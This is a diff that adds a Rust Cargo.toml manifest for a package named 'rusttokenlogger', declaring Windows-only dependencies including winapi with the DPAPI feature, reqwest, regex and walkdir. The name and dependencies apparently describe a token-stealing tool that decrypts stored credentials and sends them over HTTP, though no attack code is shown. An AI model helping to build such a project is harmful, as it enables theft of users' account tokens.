@@ -1,0 +1,15 @@
+[package]
+name = "rusttokenlogger"
+version = "0.1.0"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[dependencies]
+[target.'cfg(windows)'.dependencies]
+winapi = {version = "0.3.0", features = ["winuser","dpapi"]}
+reqwest = {version = "0.11.14", features= ["blocking"]}
+regex = "1"
+dict = "0.1.5"
+serde_json = "1.0.93"
+walkdir = "2"
